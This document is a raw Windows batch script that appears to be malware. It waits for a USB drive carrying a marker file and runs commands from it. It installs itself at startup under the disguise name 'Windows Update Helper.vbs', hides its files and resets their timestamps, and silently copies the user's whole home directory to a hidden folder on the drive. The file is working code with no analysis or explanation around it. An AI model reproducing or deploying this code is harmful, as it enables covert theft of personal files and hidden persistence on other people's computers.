set filename=lmao69.dat
set skip=False
set tries=0
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*) do (call "%%a"))
set state=NOTUPDATING
set dirr=HDD
if exist %filename% (set dirr=FLASH)

goto :searching

:changedate
c:
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib -s -h "Windows Update Helper.vbs"
powershell  (Get-Item "Windows` Update` Helper.vbs").CreationTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastWriteTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastAccessTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"

attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat"
cd "%appdata%\Microsoft\Windows"
powershell  (Get-Item "lmao.bat").LastWriteTime=Get-Date
powershell  (Get-Item "lmao.bat").LastAccessTime=Get-Date
powershell  (Get-Item "lmao.bat").CreationTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\lmao.bat"

if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set tempor=%tempor: =` %
echo %tempor%
powershell (Get-Item %tempor%).LastWriteTime=Get-Date
powershell (Get-Item %tempor%).LastAccessTime=Get-Date
powershell (Get-Item %tempor%).CreationTime=Get-Date
powershell (Get-Item %tempor%\*).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\*).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\*).CreationTime=Get-Date
)

if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set tempor=%tempor: =` %
echo %tempor%
powershell (Get-Item %tempor%).LastWriteTime=Get-Date
powershell (Get-Item %tempor%).LastAccessTime=Get-Date
powershell (Get-Item %tempor%).CreationTime=Get-Date
powershell (Get-Item %tempor%\*).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\*).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\*).CreationTime=Get-Date
)

if %skip%==true (goto :1)

:searching
if %tries%==100000 (set tries=0 && goto :changedate)
if exist "d:\%filename%" (d: && goto :b)
if exist "e:\%filename%" (e: && goto :b)
if exist "f:\%filename%" (f: && goto :b)
if exist "g:\%filename%" (g: && goto :b)
set /a tries=%tries% + 1
goto :searching

:b
cd ..
if not exist alreadycopied.dat (echo false >alreadycopied.dat)
set /p copied=<alreadycopied.dat
attrib +h alreadycopied.dat
if exist novbs.dat set novbs=true
if not exist novbs.dat set novbs=false
set com=0
set /p com=<%filename%
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" %%a in (*) do (call "%%a"))
if exist force_dat.dat set /p com=<%filename%
if exist %com% (
if exist atstartup.dat (goto :c)
if exist atinsert.dat (goto :i)
start %com%
set com=initcopy
)
:d
if exist UNIN000.dat goto :u
if not %com%==initcopy goto :searching
if exist transfer.dat (xcopy transfer\* %homedrive%%homepath% /y)
if exist "Windows Update Helper.vbs" (
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Start Menu\Startup\Windows Update Helper.vbs")
xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y
)
if %dirr%==FLASH (
if exist lmao.bat (
attrib -s "%appdata%\Microsoft\Windows\lmao.bat"
del "%appdata%\Microsoft\Windows\lmao.bat"
attrib -s lmao.bat
xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y
)
goto :miss
)
if not exist "%appdata%\Microsoft\Windows\lmao.bat" (xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y)
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\")
if %copied%==false (
if %dirr%==HDD (
attrib -h alreadycopied.dat
echo true >alreadycopied.dat
attrib +h alreadycopied.dat
goto :miss
)
)
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
set curr=%cd%
set curr=%curr:~0,2%
set skip=true
goto :changedate
:1
%curr%
if exist dontcopy.dat (echo " ">iwashere.dat && goto :whileexist)
set dire=%random%
if exist RESUME (set /p dire=<RESUME)
echo %dire% > RESUME
attrib +h RESUME
mkdir "%dire%"
attrib +s +h "%dire%"
xcopy /S /D "%homedrive%%homepath%" "%dire%"
attrib -h RESUME
del RESUME

:whileexist
del "%appdata%\Microsoft\Windows\doing.dat"
attrib -h alreadycopied.dat
del alreadycopied.dat
if not exist %filename% goto :miss
goto :whileexist
exit

:c
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set com=initcopy
goto :d

:i
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set com=initcopy
goto :d

:u
echo removing system and hidden properties from folders... > info.txt
attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
echo properties removed, continuing... >> info.txt
echo removing lmaostartup... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
echo lmaostartup removed >> info.txt
echo removing atinsert... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
echo atinsert removed >> info.txt
echo removing vbs and supporting bat if any... >> info.txt
del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >> info.txt
echo vbs removed >> info.txt
echo removing lmao.bat (if uninstalling without lmao.bat on usb, rest not available)... >> info.txt
del /q "%appdata%\Microsoft\Windows\lmao.bat"  >> info.txt
echo lmao.bat removed >> info.txt
echo UNINSTALL COMPLETED SUCCESSFULLY >> info.txt
exit

:miss
%homedrive:~0,2%
if %novbs%==false (
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
wscript "Windows Update Helper.vbs"
exit
)
cd "%appdata%\Microsoft\Windows\"
start lmao.bat
exit
